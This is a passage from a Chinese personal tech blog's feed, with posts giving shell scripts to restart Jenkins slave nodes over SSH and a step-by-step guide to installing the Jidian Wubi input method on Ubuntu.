&lt;p&gt;&lt;strong&gt;参考&lt;/strong&gt;：&lt;a href=&quot;https://issues.jenkins-ci.org/browse/JENKINS-24102&quot;&gt;Jenkins gives strack trace on main page&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="持续集成" scheme="http://yeshaoting.cn/categories/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"/>
    
    
    <category term="jenkins" scheme="http://yeshaoting.cn/tags/jenkins/"/>
    
    <category term="issue" scheme="http://yeshaoting.cn/tags/issue/"/>
    
  </entry>
  
  <entry>
    <title>jenkins节点重启脚本</title>
    <link href="http://yeshaoting.cn/article/jenkins/jenkins%E8%8A%82%E7%82%B9%E9%87%8D%E5%90%AF%E8%84%9A%E6%9C%AC/"/>
    <id>http://yeshaoting.cn/article/jenkins/jenkins%E8%8A%82%E7%82%B9%E9%87%8D%E5%90%AF%E8%84%9A%E6%9C%AC/</id>
    <published>2015-12-29T05:58:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/jenkins.png" class="img-logo img-center" /><h2 id="远程重启jenkins节点脚本"><a href="#远程重启jenkins节点脚本" class="headerlink" title="远程重启jenkins节点脚本"></a>远程重启jenkins节点脚本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">NODE_CONFIG=nodes.ini</span><br><span class="line">JENKINS_CLIENT_COMMAND=/opt/work/<span class="built_in">local</span>/jenkins/jenkins-client/bin/client.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">start_nodes</span></span>() &#123;</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">read</span> node</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">                <span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$node</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">                        <span class="built_in">continue</span>;</span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;current node: <span class="variable">$node</span>&quot;</span>;</span><br><span class="line">                start_remote_jenkins <span class="variable">$node</span>;</span><br><span class="line">        <span class="keyword">done</span> &lt; <span class="variable">$NODE_CONFIG</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">start_remote_jenkins</span></span>() &#123;</span><br><span class="line">        remote_ip=<span class="variable">$1</span></span><br><span class="line">        ssh <span class="variable">$remote_ip</span> 2&gt;&amp;1 &lt;&lt; <span class="string">remote_command</span></span><br><span class="line"><span class="string">        sh $JENKINS_CLIENT_COMMAND;</span></span><br><span class="line"><span class="string">        exit;</span></span><br><span class="line"><span class="string">remote_command</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start_nodes</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="jenkins-slave脚本"><a href="#jenkins-slave脚本" class="headerlink" title="jenkins slave脚本"></a>jenkins slave脚本</h2><p>jenkins slave重启脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">file_source</span></span>() &#123;</span><br><span class="line">  <span class="keyword">if</span> [ -f <span class="variable">$1</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">source</span> <span class="variable">$1</span>;</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_source /etc/profile</span><br><span class="line">file_source ~/.profile</span><br><span class="line">file_source ~/bash_profile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -z <span class="string">&quot;<span class="variable">$&#123;JAVA_HOME&#125;</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;please config JAVA_HOME~&quot;</span></span><br><span class="line">  <span class="built_in">exit</span> 1;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BIN_PARAM=<span class="string">&#x27;start&#x27;</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -ge 1 ]; <span class="keyword">then</span></span><br><span class="line">  BIN_PARAM=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JAVA_EXE=<span class="variable">$JAVA_HOME</span>/bin/java</span><br><span class="line"></span><br><span class="line">BIN_PATH=$( <span class="built_in">cd</span> <span class="string">&quot;<span class="subst">$( dirname <span class="string">&quot;<span class="variable">$&#123;BASH_SOURCE[0]&#125;</span>&quot;</span> )</span>&quot;</span> &amp;&amp; <span class="built_in">pwd</span> )</span><br><span class="line">SLAVE_CONFIG=<span class="variable">$BIN_PATH</span>/slave.conf</span><br><span class="line"><span class="built_in">source</span> <span class="variable">$SLAVE_CONFIG</span> </span><br><span class="line"></span><br><span class="line">SLAVE_HOME=$(dirname <span class="variable">$BIN_PATH</span>)</span><br><span class="line">LOG_FILE=<span class="variable">$SLAVE_HOME</span>/logs/jenkins_slave.log</span><br><span class="line"></span><br><span class="line">SLAVE_PID_COMMAND=<span class="string">&quot;ps -ef | grep <span class="variable">$SECRET_ID</span> | grep -v grep | awk &#x27;&#123;print \$2&#125;&#x27;&quot;</span></span><br><span class="line">SLAVE_PID=$(<span class="built_in">eval</span> <span class="variable">$SLAVE_PID_COMMAND</span>)</span><br><span class="line"></span><br><span class="line">START_COMMAND=<span class="string">&quot;nohup <span class="variable">$JAVA_EXE</span> -jar <span class="variable">$&#123;BIN_PATH&#125;</span>/slave.jar -jnlpUrl http://<span class="variable">$&#123;SERVER_HOST&#125;</span>:<span class="variable">$&#123;SERVER_PORT&#125;</span>/computer/<span class="variable">$&#123;SLAVE_NAME&#125;</span>/slave-agent.jnlp -secret <span class="variable">$SECRET_ID</span> 1&gt;&gt;<span class="variable">$LOG_FILE</span> 2&gt;&amp;1 &amp;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;========================================&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;java bin path: <span class="variable">$JAVA_EXE</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;slave client home path: <span class="variable">$SLAVE_HOME</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;slave client bin path: <span class="variable">$BIN_PATH</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;load slave client conf: <span class="variable">$SLAVE_CONFIG</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;========================================&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;jenkins connection params:&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;  - server host: <span class="variable">$SERVER_HOST</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;  - server port: <span class="variable">$SERVER_PORT</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;  - slave name: <span class="variable">$SLAVE_NAME</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;  - secret id: <span class="variable">$SECRET_ID</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;========================================&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">startup</span></span>() &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;execute get process command: <span class="variable">$SLAVE_PID_COMMAND</span>&quot;</span></span><br><span class="line">  <span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$SLAVE_PID</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;process with <span class="variable">$SECRET_ID</span> has existed.&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;jenkins slave client pid: <span class="variable">$SLAVE_PID</span>&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 0;</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;execute script shell: <span class="variable">$START_COMMAND</span>&quot;</span></span><br><span class="line">  <span class="built_in">eval</span> <span class="variable">$START_COMMAND</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;fail to startup the jenkins slave client.&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1;</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  SLAVE_PID=$(<span class="built_in">eval</span> <span class="variable">$SLAVE_PID_COMMAND</span>)</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;the jenkins slave client process id: <span class="variable">$SLAVE_PID</span>&quot;</span></span><br><span class="line">  <span class="built_in">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">shutdown</span></span>() &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;execute get process command: <span class="variable">$SLAVE_PID_COMMAND</span>&quot;</span></span><br><span class="line">  <span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$SLAVE_PID</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;no process with <span class="variable">$SECRET_ID</span>&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 0;</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  </span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;killing process with pid: <span class="variable">$SLAVE_PID</span>&quot;</span></span><br><span class="line">  <span class="built_in">kill</span> -9 <span class="variable">$SLAVE_PID</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;fail to shutdown the jenkins slave client with pid: <span class="variable">$SLAVE_PID</span>&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1;</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;the jenkins slave client has stoped.&quot;</span></span><br><span class="line">  <span class="built_in">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">bootstrap</span></span>() &#123;</span><br><span class="line">  <span class="keyword">if</span> [ <span class="variable">$BIN_PARAM</span> == <span class="string">&quot;start&quot;</span> ] || [ <span class="variable">$BIN_PARAM</span> == <span class="string">&quot;startup&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;startup jenkins slave client...&quot;</span></span><br><span class="line">    startup</span><br><span class="line">    <span class="built_in">exit</span> 0;</span><br><span class="line">  <span class="keyword">elif</span> [ <span class="variable">$BIN_PARAM</span> == <span class="string">&quot;stop&quot;</span> ] || [ <span class="variable">$BIN_PARAM</span> == <span class="string">&quot;shutdown&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;shutdown jenkins slave client...&quot;</span></span><br><span class="line">    shutdown</span><br><span class="line">    <span class="built_in">exit</span> 0;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;not support param: <span class="variable">$1</span>&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1;</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bootstrap</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="node节点"><a href="#node节点" class="headerlink" title="node节点"></a>node节点</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> links = <span class="built_in">document</span>.getElementsByClassName(<span class="string">&quot;model-link&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;links.length;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">console</span>.log(links[i].innerText);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">10.10.1.11</span><br><span class="line">10.10.1.12</span><br><span class="line">10.10.1.13</span><br><span class="line">10.13.2.14</span><br><span class="line">10.13.2.15</span><br><span class="line">10.13.2.16</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/jenkins.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;远程重启jenkins节点脚本&quot;&gt;&lt;a href=&quot;#远程重启jenkins节点脚本&quot; class=&quot;headerlink&quot; title=&quot;远程重启jenkins节点脚本&quot;&gt;&lt;/a&gt;远程重启jenkins节点脚本&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;NODE_CONFIG=nodes.ini&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;JENKINS_CLIENT_COMMAND=/opt/work/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/jenkins/jenkins-client/bin/client.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;start_nodes&lt;/span&gt;&lt;/span&gt;() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;read&lt;/span&gt; node&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ -z &lt;span class=&quot;string&quot;&gt;&amp;quot;&lt;span class=&quot;variable&quot;&gt;$node&lt;/span&gt;&amp;quot;&lt;/span&gt; ]; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        &lt;span class=&quot;built_in&quot;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;current node: &lt;span class=&quot;variable&quot;&gt;$node&lt;/span&gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                start_remote_jenkins &lt;span class=&quot;variable&quot;&gt;$node&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;done&lt;/span&gt; &amp;lt; &lt;span class=&quot;variable&quot;&gt;$NODE_CONFIG&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;start_remote_jenkins&lt;/span&gt;&lt;/span&gt;() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        remote_ip=&lt;span class=&quot;variable&quot;&gt;$1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ssh &lt;span class=&quot;variable&quot;&gt;$remote_ip&lt;/span&gt; 2&amp;gt;&amp;amp;1 &amp;lt;&amp;lt; &lt;span class=&quot;string&quot;&gt;remote_command&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;        sh $JENKINS_CLIENT_COMMAND;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;        exit;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;remote_command&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;start_nodes&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="持续集成" scheme="http://yeshaoting.cn/categories/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"/>
    
    
    <category term="jenkins" scheme="http://yeshaoting.cn/tags/jenkins/"/>
    
  </entry>
  
  <entry>
    <title>Linux安装极点五笔的方法</title>
    <link href="http://yeshaoting.cn/article/linux/Linux%E5%AE%89%E8%A3%85%E6%9E%81%E7%82%B9%E4%BA%94%E7%AC%94%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>http://yeshaoting.cn/article/linux/Linux%E5%AE%89%E8%A3%85%E6%9E%81%E7%82%B9%E4%BA%94%E7%AC%94%E7%9A%84%E6%96%B9%E6%B3%95/</id>
    <published>2015-12-29T05:58:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/ubuntu.png" class="img-logo img-center" /><h2 id="一、下载附件文件vissible-ibus-tar-gz"><a href="#一、下载附件文件vissible-ibus-tar-gz" class="headerlink" title="一、下载附件文件vissible-ibus.tar.gz"></a>一、下载附件文件vissible-ibus.tar.gz</h2><p>免费下载地址在<a href="http://linux.linuxidc.com/">http://linux.linuxidc.com/</a><br>用户名与密码都是<a href="http://www.linuxidc.com/">www.linuxidc.com</a><br>具体下载目录在/pub/2011/10/23/Ubuntu 11.10安装极点五笔/</p><h2 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ tar xvzf vissible-ibus.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> vissible-ibus</span><br><span class="line">$ sudo cp vissible.db /usr/share/ibus-table/tables</span><br><span class="line">$ sudo cp vissible.gif /usr/share/ibus-table/icons</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="三、删除文件"><a href="#三、删除文件" class="headerlink" title="三、删除文件"></a>三、删除文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ rm vissible-ibus.tar.gz</span><br><span class="line">$ rm vissible.db</span><br><span class="line">$ rm vissible.gif</span><br><span class="line">$ rm vissible.txt</span><br></pre></td></tr></table></figure><h2 id="四、启动输入法"><a href="#四、启动输入法" class="headerlink" title="四、启动输入法"></a>四、启动输入法</h2><p>在任务栏右键点那个键盘小图标，在下拉菜单选“重新重启”（这个重新启动并不是重并报启动系统，<br>而是重新启动ibus输入法），然后再右键点那个键盘小图标并在下拉菜单中选“首选项”，然后在弹<br>出的窗口中点击“输入法”选项卡，接着点“选择输入法”，然后添加极点五笔就可以了。</p><h2 id="五、修改右shift为中英文切换"><a href="#五、修改右shift为中英文切换" class="headerlink" title="五、修改右shift为中英文切换"></a>五、修改右shift为中英文切换</h2><p>把table.py里的Shift_R改为Shift_L</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim table.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># Match mode switch hotkey</span></span><br><span class="line"><span class="keyword">if</span> not self._editor._t_chars and ( self._match_hotkey (key, keysyms.Shift_L, modifier.SHIFT_MASK + modifier.RELEASE_MASK))</span><br><span class="line"></span><br><span class="line">……</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> self._match_hotkey (key, keysyms.Shift_R, modifier.SHIFT_MASK + modifier.RELEASE_MASK) and self._ime_py</span><br></pre></td></tr></table></figure><h2 id="六、参考文档"><a href="#六、参考文档" class="headerlink" title="六、参考文档"></a>六、参考文档</h2><p><a href="http://hi.baidu.com/hkdog/item/8ae75ea5938e23de5af191ff">http://hi.baidu.com/hkdog/item/8ae75ea5938e23de5af191ff</a></p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/ubuntu.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、下载附件文件vissible-ibus-tar-gz&quot;&gt;&lt;a href=&quot;#一、下载附件文件vissible-ibus-tar-gz&quot; class=&quot;headerlink&quot; title=&quot;一、下载附件文件vissible-ibus.tar.gz&quot;&gt;&lt;/a&gt;一、下载附件文件vissible-ibus.tar.gz&lt;/h2&gt;&lt;p&gt;免费下载地址在&lt;a href=&quot;http://linux.linuxidc.com/&quot;&gt;http://linux.linuxidc.com/&lt;/a&gt;&lt;br&gt;用户名与密码都是&lt;a href=&quot;http://www.linuxidc.com/&quot;&gt;www.linuxidc.com&lt;/a&gt;&lt;br&gt;具体下载目录在/pub/2011/10/23/Ubuntu 11.10安装极点五笔/&lt;/p&gt;
&lt;h2 id=&quot;二、安装&quot;&gt;&lt;a href=&quot;#二、安装&quot; class=&quot;headerlink&quot; title=&quot;二、安装&quot;&gt;&lt;/a&gt;二、安装&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ tar xvzf vissible-ibus.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ &lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; vissible-ibus&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo cp vissible.db /usr/share/ibus-table/tables&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo cp vissible.gif /usr/share/ibus-table/icons&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
